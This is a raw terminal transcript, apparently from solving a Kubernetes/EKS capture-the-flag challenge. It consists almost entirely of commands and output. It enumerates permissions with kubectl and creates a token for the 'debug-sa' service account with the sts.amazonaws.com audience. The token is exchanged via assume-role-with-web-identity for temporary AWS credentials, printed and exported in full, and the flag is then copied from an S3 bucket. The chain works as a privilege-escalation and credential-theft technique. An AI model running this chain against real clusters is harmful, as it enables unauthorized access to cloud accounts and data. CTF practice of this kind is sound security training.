$ kubectl whoami
system:node:challenge:ip-192-168-21-50.us-west-1.compute.internal


$ kubectl auth can-i --list
warning: the list may be incomplete: webhook authorizer does not support user rule resolution
Resources                                       Non-Resource URLs   Resource Names     Verbs
serviceaccounts/token                           []                  [debug-sa]         [create]
selfsubjectaccessreviews.authorization.k8s.io   []                  []                 [create]
selfsubjectrulesreviews.authorization.k8s.io    []                  []                 [create]
pods                                            []                  []                 [get list]
secrets                                         []                  []                 [get list]
serviceaccounts                                 []                  []                 [get list]
                                                [/api/*]            []                 [get]
                                                [/api]              []                 [get]
                                                [/apis/*]           []                 [get]
                                                [/apis]             []                 [get]
                                                [/healthz]          []                 [get]
                                                [/healthz]          []                 [get]
                                                [/livez]            []                 [get]
                                                [/livez]            []                 [get]
                                                [/openapi/*]        []                 [get]
                                                [/openapi]          []                 [get]
                                                [/readyz]           []                 [get]
                                                [/readyz]           []                 [get]
                                                [/version/]         []                 [get]
                                                [/version/]         []                 [get]
                                                [/version]          []                 [get]
                                                [/version]          []                 [get]
podsecuritypolicies.policy                      []                  [eks.privileged]   [use]


$ TOKEN=$(kubectl create token debug-sa --audience sts.amazonaws.com)


$ aws sts assume-role-with-web-identity --role-arn arn:aws:iam::688655246681:role/challengeEksS3Role --role-session-name something --web-identity-token $TOKEN
{
    "Credentials": {
        "AccessKeyId": "ASIA2AVYNEVM4ZT5P2UW",
        "SecretAccessKey": "wi/Y86Re4p3Wapemu7heZ5Ysi6auN49VO4ALR+18",
        "SessionToken": "IQoJb3JpZ2luX2VjEO7//////////wEaCXVzLXdlc3QtMSJGMEQCIGu1Zhw+gqMwt+4YDlit6hYSvLoLE+xOt+vrMMm/EunyAiAoy1qkxlx0xB4O09iTY8nDnMGKHh6blcq7xJBe2e9lSCq6BAhnEAAaDDY4ODY1NTI0NjY4MSIMCYE8wCXg+F8YodWJKpcEa9c1bhMz2/M80/m+nx2HGLgpRzU74Xf8l/clFAR54kbOeyNhcbGTx7vidwK8g3hRowqs4Yc6KRD+M8k2aClEjXOVnAQ1B3/5Nfk3ToFVbfEhHgr73p8xHaLoZ37tsP4k5ZuMHgaM2YOwAlHkA0W5A8EDNdY31omr73AaWErayio4VVNLJ1uUfHVd1tK1OptWojwmHQGPNX1q9CA+K8DqWDVpEFPFqiuGQgsDDFBZSGxB6Fvmt2ApzenIkzix899VYsnORbia0flx+NeM/DOL3vypLuQioYmv29uvCbn4zxFHaoEwYrzEnXBA3q0hlVJF+L9jpMt/AjGOG+PYoSpoQd6vIwZpJjYe7TYP7h97RHuJsUskusl2OaLWW8mBlmEZDSHmvU8hNfv6eBjQEvTAy4BrSfSaQILv65olVoKtLwgfaYb8Z9qHeLknGICx+hw7S8xBuLqDo6tLFJWgZyf6SE3fqH+W22CfYYSsPI41v2wbKXuFHLbPoj22xBeejHN0MI/ZW06GwS/c2pu34EA5FxeGLbUu2F4zXA/8m22KpSOCIWrKrKkZYz0VMXty6UxWsuYjEJb16IziWidGbT1XaGdsh+eij293I7tVipMl4cfGNNO2JEneAgEQVcuguVNnXWBI597Uk7Zlbz766dfi3kor5lEUyfg8Ws6lzX7r23KxzmB7OgKRPQAXwCTaWeEiaRYPAASKPjDa7O2rBjqWAegRrq14Rgn/FjgqeEIs1n8AYkAjKnNl1mys8XFcas77yNg7RU6a+a0KaHk765dosQ1LRqNt9owHXtXY5H7eNyDPvQ/Uf7EdIKWO3WV/G3QH7n4tAenWs9rCi04WtFsndp7bRefC7dBnQJdnfZsOH4xBZmZc6JkDShU9iyT3yuK7YkNdHXm/G7K5uw3ztHgPQ6T52hzQ9w==",
        "Expiration": "2023-12-14T22:40:42+00:00"
    },
    "SubjectFromWebIdentityToken": "system:serviceaccount:challenge5:debug-sa",
    "AssumedRoleUser": {
        "AssumedRoleId": "AROA2AVYNEVMZEZ2AFVYI:something",
        "Arn": "arn:aws:sts::688655246681:assumed-role/challengeEksS3Role/something"
    },
    "Provider": "arn:aws:iam::688655246681:oidc-provider/oidc.eks.us-west-1.amazonaws.com/id/C062C207C8F50DE4EC24A372FF60E589",
    "Audience": "sts.amazonaws.com"
}


$ AWS_ACCESS_KEY_ID=ASIA2AVYNEVM4ZT5P2UW


$ AWS_SECRET_ACCESS_KEY=wi/Y86Re4p3Wapemu7heZ5Ysi6auN49VO4ALR+18


$ AWS_SESSION_TOKEN=IQoJb3JpZ2luX2VjEO7//////////wEaCXVzLXdlc3QtMSJGMEQCIGu1Zhw+gqMwt+4YDlit6hYSvLoLE+xOt+vrMMm/EunyAiAoy1qkxlx0xB4O09iTY8nDnMGKHh6blcq7xJBe2e9lSCq6BAhnEAAaDDY4ODY1NTI0NjY4MSIMCYE8wCXg+F8YodWJKpcEa9c1bhMz2/M80/m+nx2HGLgpRzU74Xf8l/clFAR54kbOeyNhcbGTx7vidwK8g3hRowqs4Yc6KRD+M8k2aClEjXOVnAQ1B3/5Nfk3ToFVbfEhHgr73p8xHaLoZ37tsP4k5ZuMHgaM2YOwAlHkA0W5A8EDNdY31omr73AaWErayio4VVNLJ1uUfHVd1tK1OptWojwmHQGPNX1q9CA+K8DqWDVpEFPFqiuGQgsDDFBZSGxB6Fvmt2ApzenIkzix899VYsnORbia0flx+NeM/DOL3vypLuQioYmv29uvCbn4zxFHaoEwYrzEnXBA3q0hlVJF+L9jpMt/AjGOG+PYoSpoQd6vIwZpJjYe7TYP7h97RHuJsUskusl2OaLWW8mBlmEZDSHmvU8hNfv6eBjQEvTAy4BrSfSaQILv65olVoKtLwgfaYb8Z9qHeLknGICx+hw7S8xBuLqDo6tLFJWgZyf6SE3fqH+W22CfYYSsPI41v2wbKXuFHLbPoj22xBeejHN0MI/ZW06GwS/c2pu34EA5FxeGLbUu2F4zXA/8m22KpSOCIWrKrKkZYz0VMXty6UxWsuYjEJb16IziWidGbT1XaGdsh+eij293I7tVipMl4cfGNNO2JEneAgEQVcuguVNnXWBI597Uk7Zlbz766dfi3kor5lEUyfg8Ws6lzX7r23KxzmB7OgKRPQAXwCTaWeEiaRYPAASKPjDa7O2rBjqWAegRrq14Rgn/FjgqeEIs1n8AYkAjKnNl1mys8XFcas77yNg7RU6a+a0KaHk765dosQ1LRqNt9owHXtXY5H7eNyDPvQ/Uf7EdIKWO3WV/G3QH7n4tAenWs9rCi04WtFsndp7bRefC7dBnQJdnfZsOH4xBZmZc6JkDShU9iyT3yuK7YkNdHXm/G7K5uw3ztHgPQ6T52hzQ9w==


$ aws sts get-caller-identity
{
    "UserId": "AROA2AVYNEVMZEZ2AFVYI:something",
    "Account": "688655246681",
    "Arn": "arn:aws:sts::688655246681:assumed-role/challengeEksS3Role/something"
}


$ aws s3 cp s3://challenge-flag-bucket-3ff1ae2/flag .
download: s3://challenge-flag-bucket-3ff1ae2/flag to ./flag       


$ cat flag 
wiz_eks_challenge{w0w_y0u_really_are_4n_eks_and_aws_exp1oitation_legend}
